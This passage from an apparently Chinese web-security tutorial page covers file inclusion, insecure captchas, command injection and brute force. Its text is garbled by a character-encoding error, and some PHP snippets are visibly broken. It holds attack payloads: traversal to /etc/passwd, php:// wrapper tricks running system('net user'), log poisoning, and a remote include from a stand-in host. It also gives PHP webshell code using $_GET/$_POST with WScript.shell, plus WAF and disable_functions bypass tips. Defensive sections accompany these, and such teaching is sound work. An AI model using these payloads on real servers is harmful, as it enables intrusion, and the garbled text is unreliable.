¹ç›®å½•ä»¥å¤–çš„ç›®å½•çš„æ–‡ä»¶è¢«åŒ…å«è¿›æ¥ï¼Œåˆ†ä¸ºLFIæœ¬åœ°æ–‡ä»¶åŒ…å«å’ŒRFIè¿œç¨‹æ–‡ä»¶åŒ…å«ã€‚</p><p><strong>å‡ ç§ç»å…¸çš„æµ‹è¯•æ–¹æ³•</strong></p><p>?file=../../../../../etc/passwdd</p><p>?page=file:///etc/passwd</p><p>?home=main.cgi</p><p>?page=<a href="http://www.a.com/1.php" target="_blank" rel="noopener">http://www.a.com/1.php</a></p><p><a href="http://1.1.1.1/../../../../dir/file.txt" target="_blank" rel="noopener">http://1.1.1.1/../../../../dir/file.txt</a></p><p>ï¼ˆé€šè¿‡å¤šä¸ª../å¯ä»¥è®©ç›®å½•å›åˆ°æ ¹ç›®å½•ä¸­ç„¶åå†è¿›å…¥ç›®æ ‡ç›®å½•ï¼‰</p><p><strong>ç¼–ç ç»•è¿‡å­—ç¬¦è¿‡æ»¤</strong></p><p>å¯ä»¥ä½¿ç”¨å¤šç§ç¼–ç æ–¹å¼è¿›è¡Œç»•è¿‡</p><p>%00åµŒå…¥ä»»æ„ä½ç½®</p><p>.çš„åˆ©ç”¨</p><h3 id="äºŒã€æ–‡ä»¶åŒ…å«æ¼æ´çš„åˆ©ç”¨æŠ€å·§"><a href="#äºŒã€æ–‡ä»¶åŒ…å«æ¼æ´çš„åˆ©ç”¨æŠ€å·§" class="headerlink" title="äºŒã€æ–‡ä»¶åŒ…å«æ¼æ´çš„åˆ©ç”¨æŠ€å·§"></a>äºŒã€æ–‡ä»¶åŒ…å«æ¼æ´çš„åˆ©ç”¨æŠ€å·§</h3><p>åŒ…å«æ¼æ´ä¸Šä¼ æŠ€å·§ï¼š</p><p>ä¸€èˆ¬å°†ä¸€å¥è¯æœ¨é©¬å’Œå›¾ç‰‡è¿›è¡Œç»‘å®šä¸Šä¼ ã€‚</p><p>åŒ…å«è¯»æ–‡ä»¶ï¼š</p><p>å¦‚<a href="http://10.10.10.128/dvwa/vulnerabilities/fi/?page=php://filter/read=convert.base64-encode/resource=x.php" target="_blank" rel="noopener">http://10.10.10.128/dvwa/vulnerabilities/fi/?page=php://filter/read=convert.base64-encode/resource=x.php</a></p><p>åŒ…å«å†™æ–‡ä»¶ï¼š</p><p>æ„é€ URLï¼š<a href="http://10.10.10.128/dvwa/vulnerabilities/fi/?page=php://inputï¼Œå¹¶ä¸”æäº¤POSTæ•°æ®ä¸ºï¼š" target="_blank" rel="noopener">http://10.10.10.128/dvwa/vulnerabilities/fi/?page=php://inputï¼Œå¹¶ä¸”æäº¤POSTæ•°æ®ä¸ºï¼š</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php system(&apos;net user&apos;);?&gt;</span><br></pre></td></tr></table></figure><p>ç­‰</p><p>åŒ…å«æ—¥å¿—æ–‡ä»¶ï¼š</p><p>å½“å­˜åœ¨PHPæœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œä½†æ— æ³•ä¸Šä¼ æ­£å¸¸æ–‡ä»¶æ—¶ï¼Œå¯ä»¥åˆ©ç”¨Apacheæ—¥å¿—æ–‡ä»¶ã€‚ApacheæœåŠ¡å™¨è¿è¡Œåä¼šç”Ÿæˆä¸¤ä¸ªæ—¥å¿—æ–‡ä»¶ï¼Œè¿™ä¸¤ä¸ªæ–‡ä»¶æ˜¯access.log(è®¿é—®æ—¥å¿—)å’Œerror.log(é”™è¯¯æ—¥å¿—)ï¼Œapacheçš„æ—¥å¿—æ–‡ä»¶è®°å½•ä¸‹æˆ‘ä»¬çš„æ“ä½œï¼Œå¹¶ä¸”å†™åˆ°è®¿é—®æ—¥å¿—æ–‡ä»¶access.logä¹‹ä¸­ï¼Œä¾‹å¦‚ï¼š</p><p><a href="http://10.10.10.128/dvwa/vulnerabilities/fi/?page=../../../../Apache-20\logs\access.log" target="_blank" rel="noopener">http://10.10.10.128/dvwa/vulnerabilities/fi/?page=../../../../Apache-20\logs\access.log</a></p><p>PHPå†…ç½®çš„åè®®ï¼š</p><p><img src="/2019/01/30/å¸¸è§Webæ¼æ´ç±»å‹/2.png" alt="phpä¼ªåè®®"></p><h3 id="ä¸‰ã€æ£€æµ‹æ–¹æ³•-3"><a href="#ä¸‰ã€æ£€æµ‹æ–¹æ³•-3" class="headerlink" title="ä¸‰ã€æ£€æµ‹æ–¹æ³•"></a>ä¸‰ã€æ£€æµ‹æ–¹æ³•</h3><p>æ‰¾åˆ°æœ‰åŒ…å«å‡½æ•°çš„é¡µé¢ï¼Œå¯¹å‡½æ•°å†…å®¹è¿›è¡Œæ›¿æ¢æŸ¥çœ‹ç»“æœï¼›</p><p>å¯ä»¥ä½¿ç”¨å·¥å…·æ¥ä»£æ›¿æ‰‹å·¥çš„è¿‡ç¨‹ï¼Œå¦‚Kadimusã€Burpsuiteçš„æ’ä»¶LFI scanner checksç­‰ï¼›</p><p>ç™½ç›’æµ‹è¯•æ—¶ï¼Œå¯ä»¥åœ¨æºä»£ç ä¸­æŸ¥çœ‹allow_url_fopenã€allow_url_includeç­‰æ•æ„Ÿå‡½æ•°æ˜¯å¦å¼€å¯ã€‚</p><h3 id="å››ã€é˜²å¾¡æ–¹æ³•-3"><a href="#å››ã€é˜²å¾¡æ–¹æ³•-3" class="headerlink" title="å››ã€é˜²å¾¡æ–¹æ³•"></a>å››ã€é˜²å¾¡æ–¹æ³•</h3><p>1ã€ä¸¥æ ¼åˆ¤æ–­åŒ…å«ä¸­çš„å‚æ•°æ˜¯å¦å¤–éƒ¨å¯æ§ã€‚</p><p>2ã€è·¯å¾„é™åˆ¶ï¼Œé™åˆ¶è¢«åŒ…å«çš„æ–‡ä»¶åªèƒ½åœ¨æŸä¸€ä¸ªæ–‡ä»¶å¤¹å†…ï¼Œç‰¹åˆ«æ˜¯ä¸€å®šè¦ç¦æ­¢ç›®å½•è·³è½¬å­—ç¬¦ï¼Œå¦‚ï¼šâ€œ../â€ã€‚</p><p>3ã€åŸºäºç™½åå•çš„åŒ…å«æ–‡ä»¶éªŒè¯ï¼ŒéªŒè¯è¢«åŒ…å«çš„æ–‡ä»¶æ˜¯å¦åœ¨ç™½åå•ä¸­ã€‚</p><p>4ã€å°½é‡ä¸è¦ä½¿ç”¨åŠ¨æ€åŒ…å«ï¼Œå¯ä»¥åœ¨éœ€è¦åŒ…å«çš„é¡µé¢å›ºå®šå†™å¥½ï¼Œå¦‚ï¼šâ€œinclude(â€œhead.phpâ€)â€ã€‚</p><p>5ã€å¯ä»¥é€šè¿‡è°ƒç”¨str_replace()å‡½æ•°å®ç°ç›¸å…³æ•æ„Ÿå­—ç¬¦çš„è¿‡æ»¤ï¼Œä¸€å®šç¨‹åº¦ä¸Šé˜²å¾¡äº†è¿œç¨‹æ–‡ä»¶åŒ…å«ã€‚</p><h2 id="ä¸å®‰å…¨çš„éªŒè¯ç "><a href="#ä¸å®‰å…¨çš„éªŒè¯ç " class="headerlink" title="ä¸å®‰å…¨çš„éªŒè¯ç "></a>ä¸å®‰å…¨çš„éªŒè¯ç </h2><h3 id="ä¸€ã€åŸºæœ¬æ¦‚å¿µ-5"><a href="#ä¸€ã€åŸºæœ¬æ¦‚å¿µ-5" class="headerlink" title="ä¸€ã€åŸºæœ¬æ¦‚å¿µ"></a>ä¸€ã€åŸºæœ¬æ¦‚å¿µ</h3><p><strong>æ¼æ´å®šä¹‰</strong></p><p>éªŒè¯ç é—®é¢˜å½’ç±»ä¸ºé€»è¾‘æ¼æ´ç±»é—®é¢˜ï¼Œé€šå¸¸æ˜¯å¼€å‘è€…ç¼–å†™ä»£ç æ—¶å­˜åœ¨è®¾è®¡ç¼ºé™·ã€å¯å¯¼è‡´æŸäº›ç‰¹æ®Šæƒ…å†µä½¿å¾—éªŒè¯ç å¯è¢«ç»•è¿‡ï¼Œä»è€Œä½¿å¾—éªŒè¯ç çš„é˜²å¾¡æœºåˆ¶å½¢åŒè™šè®¾ã€‚</p><p><strong>åŸç†è¿‡ç¨‹</strong></p><p>1.å®¢æˆ·ç«¯å‘èµ·ä¸€ä¸ªè¯·æ±‚</p><p>2.æœåŠ¡ç«¯å“åº”å¹¶åˆ›å»ºä¸€ä¸ªæ–°çš„ SessionID åŒæ—¶ç”Ÿæˆä¸€ä¸ªéšæœºéªŒè¯ç </p><p>3.æœåŠ¡ç«¯å°†éªŒè¯ç å’Œ SessionID ä¸€å¹¶è¿”å›ç»™å®¢æˆ·ç«¯</p><p>4.å®¢æˆ·ç«¯æäº¤éªŒè¯ç è¿åŒ SessionID ç»™æœåŠ¡ç«¯</p><p>5.æœåŠ¡ç«¯éªŒè¯éªŒè¯ç åŒæ—¶é”€æ¯å½“å‰ä¼šè¯ï¼Œè¿”å›ç»™å®¢æˆ·ç«¯ç»“æœ</p><h3 id="äºŒã€éªŒè¯ç çš„å®‰å…¨é—®é¢˜"><a href="#äºŒã€éªŒè¯ç çš„å®‰å…¨é—®é¢˜" class="headerlink" title="äºŒã€éªŒè¯ç çš„å®‰å…¨é—®é¢˜"></a>äºŒã€éªŒè¯ç çš„å®‰å…¨é—®é¢˜</h3><p>å®¢æˆ·ç«¯é—®é¢˜ï¼š</p><p>1ã€ å®¢æˆ·ç«¯ç”ŸæˆéªŒè¯ç ï¼šéªŒè¯ç ç”±å®¢æˆ·ç«¯ JSç”Ÿæˆå¹¶ä¸”ä»…ä»…åœ¨å®¢æˆ·ç«¯ç”¨JSéªŒè¯ã€‚</p><p>2ã€ éªŒè¯ç è¾“å‡ºå®¢æˆ·ç«¯ï¼šè¾“å‡ºåœ¨HTMLä¸­ï¼Œä¸åº”è¯¥æŠŠéªŒè¯ç çš„å†…å®¹å‘é€åˆ°å®¢æˆ·ç«¯ cookie æˆ–è¾“å‡ºåˆ°response headersçš„å…¶ä»–å­—æ®µä¸­ã€‚</p><p>3ã€ éªŒè¯ç è¾“å‡ºåœ¨ cookie ä¸­ï¼šæœ‰äº›ç³»ç»Ÿé»˜è®¤ä¸æ˜¾ç¤ºéªŒè¯ç ï¼Œè€Œæ˜¯åœ¨ç”¨æˆ·æ ¡éªŒé”™è¯¯ä¸€å®šæ¬¡æ•°ä¹‹åå†å‡ºç°ã€‚é‚£å¦‚ä½•åˆ¤æ–­ç”¨æˆ·å·²ç»é”™è¯¯å‡ æ¬¡äº†å‘¢ï¼Ÿè‹¥æ˜¯å¦‚ä¸‹åˆ¤æ–­ï¼š        </p><p>ï¼ˆ1ï¼‰åœ¨ cookie ä¸­å†™å…¥ä¸€ä¸ªæ ‡è®°ï¼Œæ¯”å¦‚ loginErr = 1ï¼Œåç»­é”™è¯¯ç´¯åŠ </p><p>ï¼ˆ2ï¼‰åœ¨ session ä¸­å†™å…¥ä¸€ä¸ªæ ‡è®°ï¼Œä¾‹å¦‚ loginErr = 1ï¼Œåç»­é”™è¯¯ç´¯åŠ  </p><p>è¿™æ ·é—®é¢˜åœ¨äºï¼Œè¦æ˜¯æ”»å‡»è€…ä¸å¸¦ Cookie æäº¤ HTTP è¯·æ±‚æˆ–ä¸æ›´æ–° Cookieä¸­ loginErr çš„å€¼åå¤æäº¤ï¼Œè¿™æ ·ç¨‹åºä¼šå› ä¸ºæ— ä»è·å– Cookie/sessionIDï¼Œä¼šè®¤ä¸ºæ”»å‡»è€…æ˜¯é¦–æ¬¡è®¿é—®ï¼Œä»è€ŒéªŒè¯ç ä¸ä¼šå‡ºç°ã€‚</p><p>æœåŠ¡å™¨ç«¯é—®é¢˜ï¼š</p><p>1ã€ éªŒè¯ç ä¸è¿‡æœŸï¼Œæ²¡æœ‰åŠæ—¶é”€æ¯ä¼šè¯å¯¼è‡´éªŒè¯ç å¤ç”¨</p><p>2ã€ æ²¡æœ‰è¿›è¡Œéç©ºåˆ¤æ–­</p><p>3ã€ äº§ç”Ÿçš„éªŒè¯ç é—®é¢˜é›†å†…çš„ç­”æ¡ˆéå¸¸æœ‰é™</p><h3 id="ä¸‰ã€æ£€æµ‹æ–¹æ³•-4"><a href="#ä¸‰ã€æ£€æµ‹æ–¹æ³•-4" class="headerlink" title="ä¸‰ã€æ£€æµ‹æ–¹æ³•"></a>ä¸‰ã€æ£€æµ‹æ–¹æ³•</h3><p>ç®€å•çš„æ–¹æ³•ï¼Œå…ˆæ˜¯æ‰‹å·¥ç™»å½•å‡ æ¬¡ï¼ŒæŸ¥çœ‹æ˜¯å¦å‡ºç°éªŒè¯ç ä»¥åŠéªŒè¯ç æ˜¯å¦å¤±æ•ˆï¼Œç„¶åå†é€šè¿‡Burpsuiteæ¥è¿›ä¸€æ­¥æµ‹è¯•ã€‚</p><h3 id="å››ã€é˜²å¾¡æ–¹æ³•-4"><a href="#å››ã€é˜²å¾¡æ–¹æ³•-4" class="headerlink" title="å››ã€é˜²å¾¡æ–¹æ³•"></a>å››ã€é˜²å¾¡æ–¹æ³•</h3><p>1ã€ å¼ºåˆ¶è¦æ±‚è¾“å…¥éªŒè¯ç ï¼Œå¦åˆ™å¿…é¡»å®æ–½ IP ç­–ç•¥ã€‚æ³¨æ„ä¸è¦è¢« X-Forwarded-Forï¼ˆç”¨æ¥è¯†åˆ«é€šè¿‡HTTPä»£ç†æˆ–è´Ÿè½½å‡è¡¡æ–¹å¼è¿æ¥åˆ°WebæœåŠ¡å™¨çš„å®¢æˆ·ç«¯æœ€åŸå§‹çš„IPåœ°å€çš„HTTPè¯·æ±‚å¤´å­—æ®µï¼‰ ç»•è¿‡äº†ã€‚</p><p>2ã€ éªŒè¯ç åªèƒ½ç”¨ä¸€æ¬¡ï¼Œç”¨å®Œç«‹å³è¿‡æœŸã€‚</p><p>3ã€ éªŒè¯ç å¼ºåº¦å¢å¼ºï¼Œä½¿ç”¨æ‰­æ›²ã€å˜å½¢ã€å¹²æ‰°çº¿æ¡ã€å¹²æ‰°èƒŒæ™¯è‰²ã€å˜æ¢å­—ä½“ç­‰ã€‚</p><p>4ã€ å¤§ç½‘ç«™æœ€å¥½ç»Ÿä¸€å®‰å…¨éªŒè¯ç ï¼Œå„å¤„ä½¿ç”¨åŒä¸€ä¸ªéªŒè¯ç æ¥å£ã€‚</p><h2 id="å‘½ä»¤æ³¨å…¥æ¼æ´"><a href="#å‘½ä»¤æ³¨å…¥æ¼æ´" class="headerlink" title="å‘½ä»¤æ³¨å…¥æ¼æ´"></a>å‘½ä»¤æ³¨å…¥æ¼æ´</h2><h3 id="ä¸€ã€åŸºæœ¬æ¦‚å¿µ-6"><a href="#ä¸€ã€åŸºæœ¬æ¦‚å¿µ-6" class="headerlink" title="ä¸€ã€åŸºæœ¬æ¦‚å¿µ"></a>ä¸€ã€åŸºæœ¬æ¦‚å¿µ</h3><p><strong>æ¼æ´å®šä¹‰</strong></p><p>å½“åº”ç”¨éœ€è¦è°ƒç”¨ä¸€äº›å¤–éƒ¨ç¨‹åºå»å¤„ç†å†…å®¹çš„æƒ…å†µä¸‹ï¼Œå°±ä¼šç”¨åˆ°ä¸€äº›æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å‡½æ•°ã€‚å¦‚PHPä¸­çš„systemã€execã€shell_execç­‰ï¼Œå½“ç”¨æˆ·å¯ä»¥æ§åˆ¶å‘½ä»¤æ‰§è¡Œå‡½æ•°ä¸­çš„å‚æ•°æ—¶ï¼Œå°†å¯ä»¥æ³¨å…¥æ¶æ„ç³»ç»Ÿå‘½ä»¤åˆ°æ­£å¸¸å‘½ä»¤ä¸­ï¼Œè¾¾åˆ°ä»»æ„å‘½ä»¤æ‰§è¡Œçš„æ•ˆæœã€‚ </p><p>è¿™é‡Œä»¥PHPä¸ºä¸»ï¼Œä»¥ååœ¨Javaåˆ†ç±»ä¸­ä¼šå•ç‹¬æ€»ç»“Javaç±»çš„æ¼æ´ã€‚</p><p><strong>æˆå› </strong></p><p>ç¨‹åºæœªä¸¥æ ¼åŒºåˆ†ç”¨æˆ·è¾“å…¥çš„å†…å®¹æ˜¯æ•°æ®è¿˜æ˜¯ä»£ç ã€‚</p><p><strong>PHPä¸å‘½ä»¤æ‰§è¡Œæ¼æ´ç›¸å…³çš„å‡½æ•°</strong></p><p>1ã€PHPçš„5ç§å‘½ä»¤æ‰§è¡Œå‡½æ•°ï¼šsystem()ã€exec()ã€passthru()ã€shell_exec()ã€<code></code>è¿ç®—ç¬¦</p><p>2ã€å‘½ä»¤æ‰§è¡Œå°é›†ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">cmd=<span class="string">"system"</span>;</span><br><span class="line">ob_start(cmd);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"_GET[cunlide]"</span>;</span><br><span class="line">ob_end_flush();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">system(<span class="string">"GET[cunlide]"</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> exec(<span class="string">"$GET[cunlide]"</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> shell_exec(<span class="string">"_GET[cunlide]"</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> passthru(<span class="string">"GET[cunlide]"</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> `$GET[cunlide]`;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>3ã€PHPåé—¨æœ¨é©¬å¸¸ç”¨çš„å‡½æ•°ç±»å‹ï¼š</p><p>æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼šsystem, passthru, shell_exec, exec, popen, proc_open</p><p>ä»£ç æ‰§è¡Œä¸åŠ å¯†ï¼ševal, assert, call_user_func,base64_decode, gzinflate, gzuncompress, gzdecode, str_rot13</p><p>æ–‡ä»¶åŒ…å«ä¸ç”Ÿæˆï¼šrequireï¼Œrequire_onceï¼Œinclude,  include_onceï¼Œfile_get_contents, file_put_contents, fputs, fwrite<br>.htaccessï¼šSetHandler, auto_prepend_file, auto_append_file</p><h3 id="äºŒã€ç»•è¿‡WAFçš„æ–¹æ³•-2"><a href="#äºŒã€ç»•è¿‡WAFçš„æ–¹æ³•-2" class="headerlink" title="äºŒã€ç»•è¿‡WAFçš„æ–¹æ³•"></a>äºŒã€ç»•è¿‡WAFçš„æ–¹æ³•</h3><p><strong>1ã€é»‘ç™½åå•æµ‹è¯•ç»•è¿‡</strong></p><p><strong>2ã€å¯ç”¨ç¬¦å·æ›¿æ¢</strong></p><p><strong>3ã€æ¢è¡Œç¬¦\n</strong></p><p><strong>4ã€$IFSæ›¿æ¢ç©ºæ ¼</strong></p><h3 id="ä¸‰ã€ç»•è¿‡disable-functionsçš„æ–¹æ³•"><a href="#ä¸‰ã€ç»•è¿‡disable-functionsçš„æ–¹æ³•" class="headerlink" title="ä¸‰ã€ç»•è¿‡disable_functionsçš„æ–¹æ³•"></a>ä¸‰ã€ç»•è¿‡disable_functionsçš„æ–¹æ³•</h3><p>ç¦æ­¢ webshell æ‰§è¡Œå‘½ä»¤åŸç†ï¼šPHPé…ç½®æ–‡ä»¶é‡Œçš„disable_functions =  é…ç½®ï¼Œç”¨æ¥ç¦æ­¢æŸäº› php å‡½æ•°ã€‚</p><p>1ã€ é»‘åå•ç»•è¿‡</p><p>2ã€ ç³»ç»Ÿç»„ä»¶ç»•è¿‡ï¼ˆWindowsï¼‰ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">command=_POST[a];</span><br><span class="line">wsh = <span class="keyword">new</span> COM(<span class="string">'WScript.shell'</span>);   <span class="comment">// ç”Ÿæˆä¸€ä¸ª COM å¯¹è±¡</span></span><br><span class="line">exec = wsh-&gt;exec(<span class="string">'cmd.exe /c '</span>.command); <span class="comment">//è°ƒç”¨å¯¹è±¡æ–¹æ³•æ¥æ‰§è¡Œå‘½ä»¤</span></span><br><span class="line">stdout = exec-&gt;StdOut();</span><br><span class="line">stroutput = stdout-&gt;ReadAll();</span><br><span class="line"><span class="keyword">echo</span> $stroutput</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>Shell.Application ä¹Ÿå¯ä»¥å®ç°åŒæ ·çš„æ•ˆæœã€‚</p><p>å½»åº•çš„è§£å†³æ–¹æ¡ˆæ˜¯ç›´æ¥åˆ é™¤ System32 ç›®å½•ä¸‹ wshom.ocx æ–‡ä»¶ã€‚</p><p>3ã€ æ‰©å±•åº“ç»•è¿‡ï¼šLinuxä¸‹å¯é€šè¿‡ç¼–è¯‘æ‹“å±•åº“è¿›è¡Œç»•è¿‡ã€‚</p><p>é˜²å¾¡æ–¹æ³•ï¼šå°†dlå‡½æ•°åŠ å…¥disable_functionä¸­ç¦ç”¨ã€‚</p><p>ä½¿ç”¨PHPçªç ´Disable_functionsæ‰§è¡ŒLinuxå‘½ä»¤ï¼šlinux çš„ webshell ç®¡ç†å‘˜ç¦ç”¨äº†execï¼Œsystemï¼Œpassthruï¼Œpopenï¼Œshell_execç­‰ç­‰ PHP æ‰§è¡Œå‘½ä»¤å‡½æ•°ï¼Œå¯¼è‡´ä¸èƒ½æ‰§è¡Œå‘½ä»¤ï¼Œphp æä¾›äº†ä¸€ä¸ªæ‰©å±•æ¨¡å—åŠŸèƒ½ï¼Œä½¿ç”¨ dl å‡½æ•°èƒ½åŒ…å«ä¸€ä¸ªæ‰©å±•æ¨¡å—ã€‚ç±»ä¼¼.soæˆ–è€…æƒ³windowsä¸‹çš„ dll æ–‡ä»¶ã€‚å¯ä»¥è‡ªå®šä¹‰å‡½æ•°æ¥è°ƒç”¨ linux å‘½ä»¤è€Œæ— è§†Disable_functionsçš„é™åˆ¶ã€‚</p><p>åœ¨PHPä¸­ä½¿ç”¨create_function()åˆ›å»ºåŒ¿åå‡½æ•°ï¼Œå¦‚æœæ²¡æœ‰ä¸¥æ ¼å¯¹å‚æ•°ä¼ é€’è¿›è¡Œè¿‡æ»¤ï¼Œæ”»å‡»è€…å¯ä»¥æ„é€ ç‰¹æ®Šå­—ç¬¦ä¸²ä¼ é€’ç»™ create_function()æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚</p><h3 id="å››ã€æ£€æµ‹æ–¹æ³•-1"><a href="#å››ã€æ£€æµ‹æ–¹æ³•-1" class="headerlink" title="å››ã€æ£€æµ‹æ–¹æ³•"></a>å››ã€æ£€æµ‹æ–¹æ³•</h3><p>åŸºäºé»‘ç›’çš„æµ‹è¯•ï¼šç®€å•ç‚¹å°±æ˜¯ç›´æ¥æ‰‹å·¥åœ¨è¾“å…¥å†…å®¹ä¹‹åæ·»åŠ å„ç§åˆ†å·æˆ–å…¶å®ƒå¯ä»¥ç»•è¿‡çš„ç¬¦å·å†æ·»åŠ å‘½ä»¤ï¼Œæœ€åæŸ¥çœ‹è¿”å›ç»“æœåˆ¤æ–­ã€‚</p><p>åŸºäºç™½ç›’çš„æµ‹è¯•ï¼šæŸ¥çœ‹æºä»£ç ï¼Œæœç´¢PHPä¸­æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å‡½æ•°å¦‚systemã€passthruç­‰ã€‚</p><h3 id="äº”ã€é˜²å¾¡æ–¹æ³•-1"><a href="#äº”ã€é˜²å¾¡æ–¹æ³•-1" class="headerlink" title="äº”ã€é˜²å¾¡æ–¹æ³•"></a>äº”ã€é˜²å¾¡æ–¹æ³•</h3><p>1ã€å°½é‡ä¸è¦æ‰§è¡Œå¤–éƒ¨çš„åº”ç”¨ç¨‹åºæˆ–å‘½ä»¤ã€‚</p><p>2ã€ä½¿ç”¨è‡ªå®šä¹‰å‡½æ•°æˆ–å‡½æ•°åº“å®ç°å¤–éƒ¨åº”ç”¨ç¨‹åºæˆ–å‘½ä»¤çš„åŠŸèƒ½ã€‚</p><p>3ã€åœ¨æ‰§è¡Œ system ç­‰å‘½ä»¤æ‰§è¡ŒåŠŸèƒ½çš„å‡½æ•°å‰ï¼Œç¡®å®šå‚æ•°å†…å®¹ã€‚</p><p>4ã€ä½¿ç”¨ escapeshellarg ()å‡½æ•°å’Œescapeshellcmd()å‡½æ•°å¤„ç†ç›¸å…³ç”¨æˆ·è¾“å…¥çš„å†…å®¹ã€‚escapeshellarg() å‡½æ•°ä¼šå°†ä»»ä½•å¼•èµ·å‚æ•°æˆ–å‘½ä»¤ç»“æŸçš„å­—ç¬¦è¿›è¡Œè½¬ä¹‰ï¼Œå¦‚å•å¼•å·â€œâ€™â€ä¼šè¢«è½¬ä¹‰ä¸ºâ€œ\â€™â€ï¼ŒåŒå¼•å·â€œâ€â€ä¼šè¢«è½¬ä¹‰ä¸ºâ€œ\â€â€ï¼Œåˆ†å·â€œ ;â€ä¼šè¢«è½¬ä¹‰ä¸ºâ€œ\;â€ï¼Œè¿™æ · escapeshellarg ä¼šå°†å‚æ•°å†…å®¹é™åˆ¶åœ¨ä¸€å¯¹å•å¼•å·æˆ–åŒå¼•å·é‡Œé¢ï¼Œè½¬ä¹‰å‚æ•°ä¸­æ‰€åŒ…å«çš„å•å¼•å·æˆ–åŒå¼•å·ï¼Œä½¿å…¶æ— æ³•å¯¹å½“å‰æ‰§è¡Œè¿›è¡Œæˆªæ–­ï¼Œå®ç°é˜²èŒƒå‘½ä»¤æ³¨å…¥æ”»å‡»çš„ç›®çš„ã€‚escapeshellcmd()å‡½æ•°ä¼šè½¬ä¹‰å†…å®¹ä¸­çš„æ‰€æœ‰shellå…ƒå­—ç¬¦æ¥è¿›è¡Œé˜²å¾¡ï¼Œè¿™äº›å…ƒå­—ç¬¦åŒ…æ‹¬ï¼š# $ ; , \ â€˜ | ? * ~ &lt; &gt; ^ ( ) [ ] { } </p><p>5ã€ä½¿ç”¨ safe_mode_exec_dir æ‰§è¡Œå¯æ‰§è¡Œçš„æ–‡ä»¶è·¯å¾„ã€‚å°† php.ini æ–‡ä»¶ä¸­çš„ safe_mode è®¾ç½®ä¸º Onï¼Œç„¶åå°†å…è®¸æ‰§è¡Œçš„æ–‡ä»¶æ”¾å…¥ä¸€ä¸ªç›®å½•ä¸­ï¼Œå¹¶ä½¿ç”¨ safe_mode_exec_dir æŒ‡å®šè¿™ä¸ªå¯æ‰§è¡Œçš„æ–‡ä»¶è·¯å¾„ã€‚è¿™æ ·ï¼Œåœ¨éœ€è¦æ‰§è¡Œç›¸åº”çš„å¤–éƒ¨ç¨‹åºæ—¶ï¼Œç¨‹åºå¿…é¡»åœ¨ safe_mode_exec_diræŒ‡å®šçš„ç›®å½•ä¸­æ‰ä¼šå…è®¸æ‰§è¡Œï¼Œå¦åˆ™æ‰§è¡Œå°†å¤±è´¥ã€‚</p><h2 id="æš´åŠ›ç ´è§£"><a href="#æš´åŠ›ç ´è§£" class="headerlink" title="æš´åŠ›ç ´è§£"></a>æš´åŠ›ç ´è§£</h2><h3 id="ä¸€ã€åŸºæœ¬æ¦‚å¿µ-7"><a href="#ä¸€ã€åŸºæœ¬æ¦‚å¿µ-7" class="headerlink" title="ä¸€ã€åŸºæœ¬æ¦‚å¿µ"></a>ä¸€ã€åŸºæœ¬æ¦‚å¿µ</h3><p><strong>æ¼æ´å®šä¹‰</strong></p><p>æš´åŠ›ç ´è§£å…¶å®å¹¶ä¸ç®—æ˜¯æ¼æ´è€Œæ˜¯è®¾è®¡ç¼ºé™·ï¼Œå½“é¡µé¢æˆ–ç¨‹åºæœªå¯¹è¯·æ±‚çš„æ•°é‡è¿›è¡Œä¸¥æ ¼çš„é™åˆ¶æ—¶ï¼Œæ”»å‡»è€…å¯ä½¿ç”¨å­—å…¸ä¸€ç›´æš´åŠ›ç ´è§£ç”¨æˆ·åå¯†ç ï¼Œå¯¼è‡´å¯†ç è¢«ç ´è§£å‡ºæ¥çš„å®‰å…¨é£é™©ã€‚</p><p><strong>åˆ†ç±»</strong></p><p>1ã€C/Sæ¶æ„æš´åŠ›ç ´è§£ï¼š</p><p>ä¸»è¦ä½¿ç”¨çš„ç ´è§£å·¥å…·Hydraã€Bruterã€X-scan</p><p>2ã€B/Sæ¶æ„æš´åŠ›ç ´è§£ï¼š</p><p>ä½¿ç”¨Burpsuiteé•œåƒè¡¨å•çˆ†ç ´</p><h3 id="äºŒã€æ£€æµ‹æ–¹æ³•"><a href="#äºŒã€æ£€æµ‹æ–¹æ³•" class="headerlink" title="äºŒã€æ£€æµ‹æ–¹æ³•"></a>äºŒã€æ£€æµ‹æ–¹æ³•</h3><p>ç®€å•ç²—æš´çš„æ–¹æ³•ï¼Œç›´æ¥ä½¿ç”¨Burpsuiteè¿›è¡Œæš´åŠ›ç ´è§£ï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰ä»€ä¹ˆé˜²æš´ç ´çš„æœºåˆ¶å³å¯ã€‚</p><h3 id="ä¸‰ã€é˜²å¾¡æ–¹æ³•"><a 